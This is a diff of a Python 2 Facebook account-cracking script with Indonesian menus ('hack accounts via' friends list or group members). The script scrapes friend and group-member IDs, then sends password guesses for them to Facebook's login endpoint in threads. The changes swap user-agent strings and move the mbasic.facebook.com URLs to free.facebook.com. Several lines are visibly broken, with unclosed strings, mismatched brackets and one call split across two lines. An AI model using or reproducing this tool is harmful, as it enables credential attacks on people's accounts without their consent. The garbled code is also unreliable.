@@ -35,7 +35,7 @@ class mt(threading.Thread):
 		return self.a,self.id
 	def run(self):
 		try:
-			data = urllib2.urlopen(urllib2.Request(url='https://mbasic.facebook.com/login.php?login_attempt=1',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+			data = urllib2.urlopen(urllib2.Request(url='https://mbasic.facebook.com/login.php?login_attempt=1',data=urllib.urlencode({'email':self.id,'pass':self.p}),headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.0 Mobile Safari/537.36)]
 
 		except KeyboardInterrupt:
 			sys.exit()
@@ -137,7 +137,7 @@ def install_browser():
 	br.set_handle_equiv(True)
 	br.set_handle_referer(True)
 	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-	br.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+	br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 9.0.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.0 Mobile Safari/537.36')]
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
@@ -241,7 +241,7 @@ def login():
 	br.submit()
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
-		buka('https://mbasic.facebook.com/home.php')
+		buka('https://free.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
 		cetak('!h[*] Selamat datang !k%s'%nama)
@@ -273,7 +273,7 @@ def idgroup():
 	else:
 		return menu()
 def saring_id_teman(r):
-	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
+	for i in re.findall(r'/friends/hovercard/free/\?uid=(.*?)&',r):
 		id_bteman.append(i)
 def idteman():
 	if log != 1:
@@ -282,11 +282,11 @@ def idteman():
 		if log == 0:
 			keluar()
 	cetak('!h[*] Sedang mengumpulkan id teman...')
-	buka('https://mbasic.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
+	buka('https://free.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=free_bookmark&ref_page=XMenuController')
 	jumlah = br.find_link(url_regex='/friends/center/friends/').text
 	jumlah = re.findall(r'\((.*a?)\)',jumlah)[0]
 	cetak('!h[*] Mengambil !p%s !hid teman'%jumlah) 
-	saring_id_teman(buka('https://mbasic.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
+	saring_id_teman(buka('https://free.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=free_bookmark&ref_page=XMenuController'))
 	try:
 		next = br.find_lin
 		k(url_regex='friends_center_main').url
@@ -322,7 +322,7 @@ def menu():
 	cetak("\e[1;41mHACK AKUN MELALUI?...
 	cetak("\e[1;92m»\e[0m\e[1;77m1\e[0m\e[1;92m«\e[0m\e[1;91m DAFTAR TEMAN\e[0m
 	cetak("\e[1;92m»\e[0m\e[1;77m2\e[0m\e[1;92m«\e[0m\e[1;91m ANGGOTA GROUP\e[0m
-	cetak("\e[1;92m»\e[0m\e[1;77m3\e[0m\e[1;92m«\e[0m\e[1;91m KELUAR\e[0m      
+	cetak("\e[1;92m»\e[0m\e[1;77m3\e[0m\e[1;92m«\e[0m\e[1;91m KELUAR...\e[0m      
 	cetak("\n
 	
 	i = inputM('[?] PILIH',[1,2,3])
